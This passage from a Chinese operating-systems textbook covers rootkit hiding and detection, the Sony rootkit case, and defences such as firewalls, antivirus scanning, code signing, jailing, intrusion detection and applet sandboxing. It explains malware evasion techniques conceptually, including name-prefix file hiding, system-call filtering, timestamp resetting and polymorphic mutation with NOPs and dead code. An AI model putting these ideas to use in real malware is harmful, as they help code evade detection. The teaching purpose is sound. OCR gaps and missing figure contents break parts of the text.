这些新文件是隐藏rootkit的好地方，没有人会怀疑其存在。
这五种rootkit 可以隐藏的位置由图9-31所示。
图9-31 rootkit 可以隐藏的五种位置
2.rootkit检测
当硬件、操作系统、库和应用程序不能被信任时，rootkit 很难被检测到。
例如， 一 种查找rootkit 的 明显方法是列举磁盘上的所有文件，但是读取目录的系统调用、调用系统调用的库函数以及列表程序都 有潜在的恶意性，并有可能忽略掉与rootkit 相关的文件。
然而情况也绝非无可救药。
检测一个引导自己的管理程序并在其控制下的虚拟机中运行操作系统和应用程序的rootkit虽然难以 处理但也并非不可能。
这要求从性能和功能上仔细检查虚拟机和实际机器的细微差异。
Garfinkel 等 (2007)已经提出了一些这样的差异(如下所述),Carpenter等(2007)也讨论了这个话题。
另一类检测方法与计时相关，尤其与虚拟输入输出设备的计时相关。
假设在实际机器上读出一些PCI 设备寄存器需要100个时钟周期，这个时间很容易重现。
在 一个虚拟环境下，这个寄存器的值来自于内存， 它的读取时间依赖于它到底在CPU 一级缓存、二级缓存还是实际RAM 中。
检测程序可以轻易地强迫其在这 些状态之间来回移动并测量实际读取时间的变化。
注意我们关注的是读取时间的变化而非实际的读取时间。
另一个可以被探查的部分是执行特权指令的时间，尤其是对那些在实际硬件上只需要几个时钟周期 而在被模拟时需要几百或几千个时钟周期的特权指令。
例如，如果读出某个被保护的CPU寄存器在实际 硬件环境下需要1纳秒，那么10亿次软中断和模拟绝不可能在1秒内完成。
当然，管理程序可以欺骗报告 模拟时间而不报告所有涉及时间的系统调用的实际时间，检测程序可以通过连接提供精确时间基准的远 程主机或网站来绕过时间模拟。
因为检测程序只需要测量时间间隔(例如，执行10亿次被保护寄存器的 读操作需要多少时间),本地时钟和远程时钟的偏移没有关系。
如果没有管理程序被塞入硬件和操作系统之间，那么rootkit 可能被隐藏在操作系统中。
很难通过引 导计算机来检测其存在，因为操作系统是不可信的。
例如，rootkit可能安装大量的文件，这些文件的文 件名都由“$$$_ ”起始，当读取代表用户程序的目录时，不报告这些文件的存在。
在这样的环境下检测rootkit 的一个方法是从一个可信的外部介质(如CD-ROM/DVD 或USB棒 ) 引 导计算机，然后磁盘可以被 一 个反rootkit程序扫描，这时不用担心rootkit会干扰这个扫描。
另一 个选择 是对操作系统中的每个文件做密码散列，这些散列值可以与一个列表中的散列值进行比较，这个列表在 系统安装的时候生成并存储于系统外的一个不可被篡改的位置。
如果没有预先建立这些散列值，也可以 由安装CD-ROM或DVD即时计算得到，或由被比较文件自身进行计算得到。
库和应用程序中的rootkit 更难隐藏，当操作系统从一个外部介质装入并可信时，这些库和应用程序 的散列值也可以与已知为正确且存储与CD-ROM 上的散列值进行比较。
到目前为止，我们讨论的都是被动rootkit,它们不会干扰检测软件。
还存在一些主动rootkit,它 们 查找并破坏检测软件或至少将检测软件更改为永远报告“NO ROOTKITS FOUND!
”(没有发现rootkit), 这 些rootkit 要求更复杂的检测方法。
幸运的是，到目前为止在现实环境下主动rootkit 还没有出现。
在 发 现rootkit 后应该做什么这个问题上存在两种观点。
一 种观点认为系统管理员应该像处理癌症的
外科医生那样非常小心地切除它。
另一种观点认为尝试移除rootkit太过危险，可能还有其他碎片隐藏在 其他地方，在这一观点下，唯一的解决办法是回复到上一个已知干净的完整备份。
如果没有可用的备份， 就要求从原始CD-ROM/DVD 进行新的安装。
3.Sony rootKit
当用户插入CD到一个Windows系统计算机的驱动器中时，Windows 查找一个名为autorun.inf 的文件， 其中包含了一系列要执行的动作，通常包括打开一些CD 上的程序(如安装向导)。
正常情况下，音乐 CD没有这些文件因为即便它们存在也会被单机CD播放器忽略。
显然Sony的某个天才认为他可以聪明地 通过放置一个autorun.inf 文件在一些CD 上来防止音乐盗版。
当这些CD插入计算机时，就会立即安静地 安装一个12MB大小的rootkit 。
然后一个许可协议被显示，其中没有提到任何关于软件被安装的信息。
在显示许可的同时，Sony 的软件检查是否有200种已知的复制软件中的任一种正在运行，如果有的话就 命令用户停止这些复制软件。
如果用户同意许可协议并关闭了所有的复制软件，音乐将可以播放，否则 音乐就不能播放。
即使用户拒绝协议，rootkit 仍然被安装。
这个rootkit的工作方法如下。
它向Windows内核插入一系列文件名由“$sys$” 起始的文件。
这些文 件之一是一个过滤器，这个过滤器截取所有向CD-ROM 驱动器的系统调用并禁止除Sony的音乐播放器之 外的所有程序读取CD。
这一动作使得复制CD 到硬盘(这是合法的)变得不可能。
另一个过滤器截取所 有读取文件、进程和注册表列表的调用，并删除所有由“$sys$” 起始的项(即便这些项是由与Sony 和 音乐都完全无关的程序而来的),目的是为了掩盖rootkit 。
这一方法对于rootkit 设计新手来说非常标准。
在Russinovich 发现这一rootkit 之前，它已经被广泛地安装，这完全不令人惊讶，因为在超过2000万 张CD 上包含此rootkit 。
Dan Kaminsky(2006)研究了其广度并发现全世界超过50万个网络中的计算机 已经被感染。
随着故事的终结，人们发现Sony的卸载程序存在技术缺陷，使得被感染的计算机非常容易遭受互联 网上的攻击。
人们还发现该rootkit 包含了从开源项目而来的代码，这违反了这些开源项目的著作权(这 些开源项目的著作权要求对其软件的免费使用也发布源代码)。
除了空前的公众关系灾难之外，Sony 也面临着法律危机。
德克萨斯州控告Sony 违反了其反间谍软 件法以及欺诈性贸易惯例法(因为即使许可被拒绝rootkit 仍然会被安装)。
此后在39个州都提起了公诉。
在2006年12月，在Sony同意支付425万美元、同意停止在其未来的CD中放入rootkit 并授权每位受害者可 以下载一个有限的音乐目录下的三张专辑之后，这些诉讼得以解决。
在2007年1月，Sony 承认其软件秘 密监视用户的收听习惯并将其报告回Sony 也违反了美国法律。
在与公平贸易委员会 (FTC) 的协议中， Sony同意支付那些计算机遭到其软件破坏的用户150美元的补偿。
关于Sony的rootkit 的故事已经为每一位曾经认为rootkit 只是学术上的稀奇事物而与现实世界无关的 读者提供了实例。
在互联网上搜索 “Sony rootkit”会发现大量补充信息。
9.10 防御
面对危机四伏的状况，那么还有确保系统安全的可能吗?
当然，是有的，下面的小节要介绍一下几 种设计和实现系统的方法来提高它们的安全性。
一个最重要的概念就是全面防御 (defense in depth)。
基本地讲，这个概念是指你必须有多层的安全性，以便于当其中的一层被破坏，仍然还有其他层要去防 御。
想象一下这样的一个房子，有一个高的带钉子的关闭着的铁栅栏，在院子里有运动检测器，前门上 有两把做工精良的锁，屋子里还有一个计算机控制的盗窃报警系统。
每一个技术自己本身都是有价值的， 为了闯入这个房子盗贼需要打败所有的防御。
一个安全的计算机系统就应该像这个房子一样，有着多层 的安全性。
我们将要介绍其中的某些层次。
防御不是真的分等级的，而是我们要从一般的外部的东西开 始，然后逐渐深入到细节。
9.10.1 防火墙
因此，我们需要某种机制来保证“好”的留下来并且阻止“坏”的进入。
一种方法是使用防火墙 (firewall), 它是一种中世纪古老的安全措施的现代版本：在你的城堡周围挖一条护城河。
这样的设计强 制每一个进入或者离开城堡的人都要经过唯一的一座吊桥，I/O 警察可以在吊桥上检查每一个经过的人。
对于网络，这种方法也是可行的： 一个公司可能有很多的任意连接的局域网，但是所有进入或离开公司 的网络流都要强制地通过一个电子吊桥——防火墙。
防火墙有两种基本的类型：硬件防火墙和软件防火墙。
有局域网需要保护的公司通常选择硬件防火 墙；而家庭的个人用户通常会选择软件防火墙。
首先，让我们看一看硬件防火墙。
一般的硬件防护墙如 图9-32所示。
在该图中，来自网络提供者的连接(电缆或光纤)会被插到防火墙上，防火墙也连接到局域 网上。
不经过防火墙的允许任何包都不能进入或者离开局域网。
实际的情况下，防护墙通常会和路由器、 网络地址转换盒、指令检查系统和其他设备联合起来工作，但是在这里我们只关注于防火墙自身的功能。
207.68.160.190:80 207.68.160.191:25 207.68.160.192:21
图9-32 一个由防火墙保护的局域网示意图(含三台主机)
除了无状态防火墙以外，还有一种跟踪连接以及连接状况的状态防火墙。
这些防火墙能够更好地防 止某些类型的攻击，特别是那些和建立连接有关的攻击。
另外， 一些其他类型的防火墙实现了入侵检测 系统 (Intrusion Detection System,IDS),利 用IDS防火墙不仅可以检测包的头部还可以用检测包的内容 来查找可疑的内容。
9.10.2 反病毒和抑制反病毒技术
正如上文所提到的，防火墙会尽量地阻止入侵者进入电脑，但是在很多情况下防火墙会失败。
在这 种情况下，下一道防线是由反恶意软件的程序 (antimalw are program) 组成的。
尽管这种反恶意软件的 程序同样可以对抗蠕虫和间谍软件，但是它们通常称作反病毒程序 (antivirus program)。
病毒尽量地隐 藏自己，而用户则是努力地发现它们，这就像是一个猫捉老鼠的游戏。
在这方面，病毒很像rootkit, 不 同的地方是病毒的制造者更强调的是病毒的传播速度而不是像rookit一样注重于捉迷藏。
现在，让我们 来看看反病毒软件所使用的技术，以及病毒的制造者Virgil是怎么应对这些技术的。
1. 病毒扫描器
显然，一般用户没有去查找竭尽全力藏身的大多数病毒，所以市场上出现了反病毒软件。
下面我们 将讨论一下反病毒软件的工作原理。
反病毒软件公司拥有一流的实验室，在那里许多专家长时间地跟踪 并研究不断涌现出的新病毒。
第一步是让病毒感染不执行任何操作的程序，这类程序叫作诱饵文件，然 后获取病毒的完整内容。
下一步是列出病毒的完全代码表把它输入已知病毒的数据库。
公司之间为其数 据库的容量而竞争。
发现新的病毒就放到数据库中与体育竞赛是完全不同的。
由于有些已知病毒总是在不断发生细微变化，所以人们需要一种模糊查询软件，这样即便3个字节 的改变也不会让病毒逃避检测。
但是，模糊查询不仅比正常查询慢，而且容易导致错误报警(误测)。
7 年前在巴基斯坦，有些合法的文件恰巧包含了与病毒代码极为相像的字符，结果导致了病毒报警。
用户 这时往往会看到下面的信息：
WARNING!
File xyz.exe may contain the lahore-9x virus.Delete?
数据库里的病毒越多，扫描标准越宽松，误报警的可能性就越大。
如果出现了太多的误报警，用户 会因为厌烦而放弃使用。
但是如果病毒扫描器坚持严格匹配病毒码，它就会错过许多变形病毒。
解决办 法是要达到一种微妙的启发式平衡，完美的扫描软件应该识别病毒的核心代码，这些核心代码不会轻易 改变，从而能够作为病毒的特征签名来查找。
由于磁盘里的文件上周被宣布无病毒感染后并不意味着现在仍未被感染，所以人们需要经常使用病 毒扫描。
因为扫描速度很慢，所以要保持效率就应该仅对上次扫描后被改动的文件进行检查。
但是，聪 明的病毒会把感染过的文件日期重置为初始日期以逃避检验。
于是，反病毒程序修改校验文件所在目录 的日期。
但是病毒接着又把目录的日期也改掉。
这就像我们上面所提到的猫捉老鼠游戏一样。
文件变长
然 而 ，Virgil 喜欢笑到最后，所以他采用了下面的步骤。
假设解密过程需要进行如下运算：
X=(A+B+C-4)
在普通的双地址计算机上可以运用汇编语言编写该运算，如图9-34a 所示。
第一个地址是源地址， 第二个地址是目标地址，所以MOV A,R1是把变量A 放入寄存器R1 中。
图9-34b的代码也是同样的意思， 不同之处仅仅在于代码中插入了NOP (无操作)指令而降低了效率。
现在假设在这段代码里不再需要R5 寄存器。
也就是说，图9-34d 与图9-34a的功能一致。
最后，在许 多情况下，可以交换指令而不会改变程序功能，我们用图9-34e作为另一种与图9-34a在逻辑上保持一致
图9-34 多形态病毒的实例
要求较差的反病毒软件意识到图9-34a 至图9-34e具有相同的代码功能是相当困难的，特别是当变异 引擎有能力“狡兔三窟”时。
反病毒软件可以分析病毒代码，了解病毒原理，甚至可以试图模拟代码操 作，但我们必须记住有成千上万的病毒和成千上万的文件需要分析，所以每次测试不能花费太多的时间， 否则运行起来会惊人地慢。
另外，储存在变量Y里的值是为了让人们难以发现与R5 有关的代码是死码的事实，死码不会做任何 事情。
如果其他代码段对Y 进行了读写，代码就会看上去十分合法。
一个写得十分好的变异引擎代码会 产生极强的变种，会给反病毒软件的作者带来噩梦般的麻烦。
唯一让人安慰的是这样的引擎很难编写， 所以Virgil的朋友都使用他的代码，结果在病毒界里并没有种类繁多的变异引擎。
到目前为止，我们讨论的是如何识别被感染的可执行文件里的病毒。
而且，反病毒扫描器必须检查 MBR、引导扇区、坏扇区列表、闪速ROM 、CMOS 等区域。
但是如果有内存驻留病毒在运行会怎样 呢?
该内存驻留病毒不会被发现。
更糟的是假设运行的病毒正在控制所有的系统调用，它就能轻易地探 测到反病毒程序正在读引导扇区(用以查找病毒)。
为了阻止反病毒程序，病毒进行系统调用，相反它 把真正的引导区从坏扇区列表的藏身之地返回。
它也可以作记录，在被扫描器检查以后会再次感染所有 的 文 件 。
为了防止被病毒欺骗，反病毒程序也可以会跳过操作系统直接去读物理磁盘。
不过这样做需要具有 用于IDE 、SCSI 和其他种类硬盘的内置设备驱动程序，这样会降低反病毒程序的可移植性，遇到不通用 的硬盘就会一筹莫展。
而且，跳过操作系统来读取引导扇区是可以的，但是跳过操作系统来读取所有的 可执行文件却是不可能的，所以仍然存在病毒产生出与可执行文件相关的欺骗性数据的危险。
2. 完整性检查程序
3.行为检查程序
第三种反病毒程序使用的方法是实施行为检查 (beha vioral checking)。
通过这种方法，反病毒程序 在系统运行时驻留在内存里，并自己捕捉所有的系统调用。
这一方法能够监视所有的系统活动，并试图 捕捉任何可能被怀疑的行为。
例如，通常没有程序会覆盖引导扇区，所以有这种企图的程序几乎可以肯 定是病毒。
同理，改变闪速ROM的内容也值得怀疑。
但是也有些情况比较难以判断。
例如，覆盖可执行文件是一个特殊的操作，除非是编译器。
如果反 病毒程序检测到了这样一个写的动作并发出了警告，它希望用户能根据当时情形决定是否要覆盖可执行 文件。
同样，当Word 用一个全是宏的新文件重写.doc文件时不一定是病毒的杰作。
在Windows 中程序可 以从可执行文件里分离出来，并使用特殊的系统调用驻留内存。
当然，这也可能是合法的，但是给出警 告还是十分有用的。
病毒并不会被动地等着反病毒程序杀死自己，它们也会反击。
一场特别有趣的战斗会发生在内存驻 留病毒和内存驻留反病毒程序之间。
多年以前，有一个叫作Core Wars的游戏，在游戏里两个程序员各 自放置程序到空余的地址空间里。
程序依次抢夺内存，目的是把对手的程序清理出去来扩大自己的地盘。
病毒与反病毒程序之间的战斗就有点像这个游戏，而战场转换到了那些并不希望战斗发生的受害者的机 器里。
更糟的是，病毒有一个优势，它可以去买反病毒软件来了解对手。
当然， 一旦病毒出现，反病毒 小组也会修改软件，从而逼迫Virgil 不得不再买新的版本。
4.病毒避免
每一个好的故事都需要理念。
这里的理念是：
与其遗憾不如尽量安全，即有备无患。
避免病毒比起在计算机感染后去试图追踪它们要容易得多。
下面是一些个人用户的使用指南，这也 是整个产业界为减轻病毒问题所做的努力。
用户该怎样做来避免病毒感染呢?
第一，选择能提供高度安全保障的操作系统，这样的系统应该拥 有强大的核心-用户态边界，分离提供每个用户和系统管理员的登录密码。
在这些条件下，溜进来的病 毒无法感染系统代码。
第四，不要点击电子邮件里的附件，告诉他人不要发送附件给自己。
使用简明ASCII 文本的邮件比 较安全，而附件在打开时可能会启动病毒程序。
第五，定期将重要文件备份到外部存储介质，如软磁盘、CD-R 或磁带等。
在一系列的备份介质中 应该保存不同的版本。
这样，当发现病毒时就有机会还原被感染前的文件。
例如，假设还原昨天已被感 染的备份版本不成功的话，还原上一周的版本也许会有用。
整个业界应该重视病毒并改变一些危险的做法。
第一，制造简单的操作系统。
铃声和口哨声越多， 安全漏洞也越多，这就是现实。
第二，不要使用动态文本。
从安全角度来说，动态文本是可怕的。
浏览别人提供的文档时最好不要 运行别人提供的程序。
例如，JPEG 文件就不包含程序，所以也就不会含有病毒。
所有的文档都应该以 这样的方式工作。
第三，应该采取措施将重要的磁盘柱面有选择性地写保护，防止病毒感染程序。
这种方法必须在控 制器内部放置位图说明，位图里含有受保护磁盘柱面的分布图。
只有当用户拨动了计算机面板上的机械 拨动开关后，位图才能够被改动。
第四，使用闪存是个好主意，但只有用户拨动了外部开关后才能被改动，如当用户有意识地安装
9.10.3 代码签名
一种完全不同的防止恶意软件的方法(全面防御),是我们只运行那些来自可靠的软件厂商的没有 被修改过的软件。
马上我们会问，用户如何知道软件的确是来自它自己所声称的厂商，并且用户又如何 知道软件从它被生产之后没有被修改过呢。
当我们从一个名声未知的在线商店中下载软件或者从站点下 载ActiveX 控件的时候，这个问题就显得格外重要。
例如，如果ActiveX 控件来自一个著名的软件公司， 那么它几乎不可能包含一个木马程序，但是，用户如何确信这一点呢?
一种被广泛应用的解决办法是数字签名，这部分内容在9.5.4节中已经讲解过。
如果用户只运行那些 由可信的地方制造并签名的程序、插件、驱动、ActiveX 控件以及其他软件，那么陷入麻烦的机会就会 少得多。
但是这样做导致的后果就是，那些来自于Snarky Software的新的、免费的、好玩的、花哨的游 戏可能非常不错但是不会通过数字签名的检查，因为你不知道谁制造了他们。
当用户得到这个软件后，计算出散列函数并保存结果，然后将附带的数字签名用公钥进行解密。
接 着，核对解密后的散列函数值同自己运算出的值是否相等。
如果相等，这个软件就被接受，否则就作为 伪造版本被拒绝。
这里所用到的数学方法使得任何想要篡改软件的人十分难以得手，因为这个散列函数 要同从真正的数字签名中解密出来的散列函数匹配。
在没有私钥的情况下通过产生匹配的假数字签名是 十分困难的。
签名和校验的过程如图9-35所示。
图9-35 代码签名的工作原理
网页能够包含代码，比如ActiveX 控件，以及各种脚本语言写出的代码。
通常这些代码会被签名， 而浏览器会自动地检查这些签名。
当然，为了验证签名，浏览器需要软件厂商的公钥，它们通常和代码 在一起。
和公钥一起的还有被某个CA 签名过的证书。
如果浏览器已经保存了这个CA的公钥的话，它可 以自己验证这个证书。
如果这个证书是被浏览器所不知道的某个CA 签名的话，那么它会弹出一个对话 框询问是否接受这个证书。
9.10.4 囚 禁
一个古老的俄国谚语说：“相信但需要验证。
” 很明显地，古代的俄国人在头脑中就已经清楚地有 了软件的概念。
即使一个软件已经被签名了， 一个 好的态度是去核实它是否都能正常运行。
做这件事 情的一种技术是囚禁 (jailing), 如图9-36所示。
如图9-36,一个新被接受的程序会作为一个标 有“囚犯”的标签的进程来运行。
这个“狱卒”是
图9-36 囚禁的操作过程
一个可信任的(系统的)进程，可以监管囚犯进程的行为。
当一个被监禁的进程作出一个系统调用的时 候，系统调用不会执行，而是把控制移交给狱卒进程(通过一个内核陷入)并把系统调用号和参数传递 给它。
这个狱卒进程会判断是否这个系统调用被允许。
例如，如果被监禁的进程试图和一个狱卒进程不 知道的远程主机建立一个网络连接，这个系统调用会被拒绝然后该囚犯进程被结束。
如果这个系统调用 是可以接受的，那么狱卒进程会通知内核，由内核来执行该系统调用。
通过使用这种方法，不正确的行 为会在它引起麻烦之前被捕捉到。
囚禁有很多的实现方法。
有一种方法可以在不需要修改内核的情况下，在几乎任何一个UNIX系统 上实现，这种方法是Van't Noordende等人在2007年提出的。
在nutshell中，这个方法使用普通的UNIX调 试功能，让狱卒进程作为调试者而囚犯进程作为被调试者。
这种情况下，调试者可以指示内核把被调试 者封装起来，然后把被调试者的所有系统调用都传递给自己来监视。
9.10.5 基于模型的入侵检测
还有一种方法可以保护我们的机器，那就是安装一个IDS(Intrusion Detection System) 。
IDS有两 种基本的类型，一种关注于监测进入电脑的网络包，另一种关注寻找CPU 上的异常情况。
之前在防火墙 的部分我们简要地提到了网络IDS; 现在我们对于基于主机的IDS进行一些讲解。
出于篇幅限制，我们 不能够审视全部的种类繁多的基于主机的IDS 。
相反地，我们选择一种类型来简单地了解它们是如何工 作的。
这种类型是基于静态模型的入侵检测(Wag ner和Dean,2001)。
它可以用上面提到的囚禁技术来 实现，同时也有其他的实现方法。
在图9-37a中我们看到了这样一个小程序，它打开一个叫data的文件，然后每次一个字符地读入，直 到遇到了一个0字节，这时打印出文件开始部分的非0字节的个数然后程序退出。
在图9-37b中，我们看 到了这个程序的系统调用图(这里打印被叫作write)。
图9-37 a) 程序；b) 该程序的系统调用图
这个图告诉了我们什么呢?
首先，在任何情况下，这个程序的第一个系统调用一定是open 。
第二个 系统调用是read 或者write,这要根据执行if语句的那个分支来决定。
如果第二个系统调用是write,那 么 就意味着文件无法打开，然后下一个系统调用必须是exit。
如果第二个系统调用是read,那么可能还有额 外任意多次的read调用，并且最后调用close、write和exit。
在没有入侵的情况下，其他序列是不可能的。
如果这个程序被囚禁，那么狱卒程序可以看到所有的系统调用并很容易地验证某个序列是不是有效的。
现在假设某人发现了这个程序的一个错误 (bug), 然后成功地引起了缓冲区溢出，插入并执行了恶 意代码。
当恶意代码运行的时候，极大的可能是会执行一个不同的系统调用序列。
例如，恶意代码可能 尝试打开某个它想要复制的文件或者可能和家里的电话建立网络连接。
当第一次出现系统调用不符合原
来的模式时，狱卒十分肯定地认定出现了攻击并会采取行动，比如结束这个进程并向系统管理员报警。
这样， 入侵检测系统就能够在攻击发生的时候检查到它们。
静态系统调用分析只是很多IDS工作方法中的一种。
当使用这种基于静态模型的入侵检测的时候，狱卒必须知道这个模型(比如系统调用图)。
最直接 的方式就是让编译器产生它并让程序的作者签名同时附上它的证书。
这样的话，任何预先修改可执行程 序的企图都会被在程序运行的时候检测到，因为实际的行为和被签过名的预期行为不一致。
很不幸的是，一个聪明的攻击者可能发动一种叫作模仿攻击 (mimi cry attack)的攻击，在这种攻 击中插入的代码会有和该程序同样的系统调用序列(Wagner 和Soto,2002), 所以我们需要更复杂的模 型，不能仅仅依靠跟踪系统调用。
然而，作为深层防御的一部分，IDS 还是扮演着重要的角色。
无论如何，基于模型的IDS不仅仅是一种。
许多IDS利用了一个叫作蜜罐 (honeypot) 的概念，这是 一个吸引和捕捉攻击者和恶意软件的陷阱。
通常蜜罐会是一个孤立的机器，几乎没有防御，表面看起来 令人感兴趣并且有些有价值的内容，像一个成熟等待采摘的果实一样。
设置蜜罐的人会小心翼翼地监视 它上面的任何攻击并尽量去了解攻击的特征。
一些IDS会把蜜罐放在虚拟机上防止对下层实际系统的破 坏。
所以很自然地，恶意软件也会像之前提到的那样努力检查自己是否运行在虚拟机上。
9.10.6 封装移动代码
另一个让程序从一台计算机到另一台计算机上运行的例子是代理程序 (agent) 。
代理程序指用户让 程序在目标计算机上执行任务后再返回报告。
例如，要求某个代理程序查看旅游网站，查找从阿姆斯特 丹到旧金山的最便宜航线。
代理程序会登录到每个站点上运行，找到所需的信息后，再前进到下一个站 点。
当所有的站点查询完毕后，它返回原处并报告结果。
第三个移动代码的例子是PostScript文件中的移动代码，这个文件将在PostScript打印机上打印出来。
很久以前，操作系统推出了进程的概念，为的是在用户之间建立隔离墙。
在这一概念中，每个进程 都有自己的保护地址空间和UID, 允许获取自己的文件和资源，而不能获取他人的。
而对于保护进程的 一 部分(指Applet) 或者其他资源来说，进程概念也无能为力。
线程允许在一个进程中控制多个线程， 但是单个线程与其他线程之间却没有提供保护。
从理论上来说，将每个Applet 作为独立的进程运行只能帮上一点忙，但缺乏可操作性。
例如，某个 Web网页包含了相互之间互相影响的两个或多个Applet, 而数据在Web页 里 。
Web 浏览器也需要与Applet 交互，启动或停止它们，为它们输入数据等。
如果每个Applet 被放在自己的进程里，就无法进行任何操 作。
而且，把每个Applet 放在自己的地址空间里并不能保证Applet 不窃取或损害数据。
如果有Applet 想 这样做是很容易的，因为没有人在一旁监视。
人们还使用了许多新方法来对付Applet (通常是移动代码)。
下面我们将看看其中的两种方法：沙 盒法和解释法。
另外，代码签名同样能够用于验证Applet 代码。
每一种方法都有自己的长处和短处。
1.沙盒法
第一种方法叫作沙盒法 (sandboxing), 这种方法将每个运行的Applet限制在一定范围的有效地址中
(Wahbe等人，1993)。
它的工作原理是把虚拟地址空间划 分为相同大小的区域，每个区域叫作沙盒。
每个沙盒必须 保证所有的地址共享高位字节。
对32位的地址来说，我们 可以把它划分为256个沙盒，每个沙盒有16MB空间并共享 相同的高8位。
同样，我们也可以划分为512个8MB空间的 沙盒，每个沙盒共享9位地址前缀。
沙盒的尺寸可以选取 到足够容纳最大的Applet 而不浪费太多的地址空间。
如果 页面调用满足的话，物理内存不会成为问题。
每个 Applet 拥有两个沙盒， 一个放置代码，另一个放置数据， 如图9-38a所示的16个16MB的沙盒。
沙盒的用意在于保证每个Applet不能跳转到或引用其他 的代码沙盒或数据沙盒。
提供两个沙盒的目的是为了避免 Applet在运行时超越限制修改代码。
通过抑制把所有的 Applet放入代码沙盒，我们减少了自我修改代码的危险。
只 要Applet通过这种方法受到限制，它就不能损害浏览器或其 他 的Applet, 也不能在内存里培植病毒或者对内存造成损失。
只要Applet 被装入，它就被重新分配到沙盒的开头，然后系统检查代码和数据的引用是否已被限制 在相应的沙盒里。
在下面的讨论中，我们将看一下代码引用(如JMP 和CALL指令),数据引用也是如此。
使用直接寻址的静态JMP 指令很容易检查：目标地址是否仍旧在代码沙盒里?
同样，相对JMP 指令也很 容易检查。
如果Applet 含有要试图离开代码沙盒的代码，它就会被拒绝并不予执行。
同样，试图接触外 界 数 据 的Applet 也 会 被 拒 绝 。
最困难的是动态JMP 。
大多数计算机都有这样一条指令，该指令中要跳转的目标地址在运行的时候 计算，该地址被存入一寄存器，然后间接跳转。
例如，通过JMP(R1) 跳转到寄存器1里存放的地址。
这种指令的有效性必须在运行时检查。
检查时，系统直接在间接跳转之前插入代码，以便测试目标地址。
这样测试的一个例子如图9-38b所示。
请记住，所有的有效地址都有同样的高k位地址，所以该地址前缀 被存放在临时寄存器里，如说S2。
这样的寄存器不能被Applet自身使用，因为Applet 有可能要求重写寄 存器以避免受该寄存器限制 。
有关代码是按如下工作的：首先把被检查的目标地址复制到临时寄存器S1 中。
然后该寄存器向右 移位正好将S1中的地址前缀隔离出来。
第二步将隔离出的前缀同原先装入S2 寄存器里的正确前缀进行 比较。
如果不匹配就激活陷入程序杀死进程。
这段代码序列需要四条指令和两个临时寄存器。
对运行中的二进制程序打补丁需要一些工作，但却是可行的。
如果Applet是以源代码形式出现，工 作就容易得多。
随后在本地的编译器对Applet 进行编译，自动查看静态地址并插入代码来校验运行中的
动态地址。
同样也需要一些运行时间的开销以便进行动态校验。
Wahbe 等人(1993)估计这方面的时间
大约占4%,这一般是可接受的。
另一个要解决的问题是当Applet试图进行系统调用时会发生什么?
解决方法是很直接的。
系统调用的 指令被一个叫作基准监视器的特殊模块所替代，这一模块采用了与动态地址校验相同的检查方式(或者， 如果有源代码，可以链接一个调用基准监视器的库文件，而不是执行系统调用)。
在这两个方法中，基准 监视器检查每一个调用企图，并决定该调用是否可以安全执行。
如果认为该调用是可接受的，如在指定的 暂存目录中写临时文件，这种调用就可以执行。
如果调用被认为是危险的或者基准监视器无法判断， Applet就被终止。
若基准监视器可以判断是哪一个Applet执行的调用，内存里的一个基准监视器就能处理 所 有 这 样Applet的请求。
基准监视器通常从配置文件中获知是否允许执行。
2.解释
第二种运行不安全Applet的方法是解释运行并阻止它们获得对硬件的控制。
Web浏览器使用的就是
这种方法。
网页上的Applet 通常是用Java 写 的 ，Java 可以是一种普通的编程语言，也可以是高级脚本语 言，如安全TCL 语言或Javascript 。
Java Applet首先被编
译成一种叫作JVM(Java 虚拟机，Java Virtual Machine) 的面向栈的机器语言。
正是这些JVM Applet被放在网页 上，当它们被下载时就插入到浏览器内置的JVM解释器 中，如图9-39所示。
使用解释运行的代码比编译运行的代码好处在于， 每一条指令在执行前都由解释器进行检查。
这就给了解 释器识别校验地址是否有效的机会。
另外，系统调用也 可以被捕捉并解释。
这些调用的处理方式与安全策略有 关。
例如，如果Applet 是可信任的(如来自本地磁盘的 Applet), 它的系统调用就可以毫无疑问会被执行。
但是 如果Applet不受信任(如来自Internet 的Applet), 它就会 被放入沙盒来限制自身的行为。
图9-39 Applet 可以被Web浏览器以解释方式 执行
高级脚本语言也能够被解释执行。
这里，解释执行不需要机器地址，所以也就不存在脚本以不允许 的方式访问内存所带来的危险。
解释运行的缺点是：它与编译运行的代码相比十分缓慢。
9.10.7 Java安全性
人们设计了Java 编程语言和相关的运行时系统，是为了一次编写并编译后就能够在Interent 上以二进 制代码的形式运行在所有支持Java 的机器上。
从一开始设计Java 语言开始，安全性就成为其重要的一部 分。
在这一小节，我们来看看它的工作原理。
Java 是一种类型安全的编程语言，即编译器拒绝任何值与类型不符的变量的使用。
而C语言正好相 反，请看下面的代码：
naughty_func()
(
char*p;
p=rand();
*p=0;
}
代码把产生的随机数放在指针p中。
然后把0字节存储在p所包含的地址中，覆盖了地址里原先的任 何代码和数据。
而在Java 中，混合使用类型的语句是被语法所禁止的。
而且，Java 没有指针变量、类型 转换、用户控制的存储单元分配(如malloc和free), 并且所有的数组引用都要在运行时进行校验。
Java 程序被编译成一种叫作JVM(Java Virtual Machine) 字节码的中间形态二进制代码。
JVM 有大 约100个指令，大多数指令是把不同类型的对象压入栈、弹出栈或是用算术合并栈里的对象。
这些JVM 程序通常是解释执行程序，虽然在某些情况下它们可以被编译成机器语言以便执行得更快。
在Java 模式 中，通过Internet 发送到远程计算机上运行的Applet是JVM程序。
当Applet 到达远程计算机时，首先由JVM 字节码校验器查看Applet 是否符合规则。
正确编译的 Applet 会自动符合规则，但无法阻止一个恶意的用户用汇编语言写JVM格式的Applet。
校验的规则包括：
1)Applet是否伪造了指针?
2)是否违背了私有类成员的访问限制?
3)是否试图把某种类型的变量用作其他类型?
4)是否产生栈上溢或下溢?
5)是否非法地将变量从一种类型转换为另一种类型?
如果Applet 通过了所有的测试，它就能被安全地执行并且不用担心它会访问非自己所有内存空间。
但是Applet 也可以通过调用Java 方法(过程)来执行系统调用。
Java 处理这种调用的方法也在不断 在进步。
在最初的Java 版本JDK(Java Development Kit)1.0里 ，Applet 被分为两类：可信的与不可信的。
从本地磁盘取出的Applet 是可信的并被允许执行任何所需要的系统调用。
相反，从Internet 获取的Applet 是不可信的。
它们被限制在沙盒里运行，如图9-39所示，实际上并不能做什么事。
在从这一模式中取得了些经验后，Sun 公司认为对Applet的限制太大了。
在JDK 1.1版本里，引入了 版本标注。
当Applet 从Internet 传递过来后，系统首先查看Applet 是否有用户信任的个人或组织标注(通 过用户所信任的标注者列表来定义)。
如果是，Applet 就被允许做任何操作，否则就必须在沙盒里运行 并且受到很强的限制。
在获取了一些经验后，代码标注也不那么令人满意了，所以安全模式又有了变化。
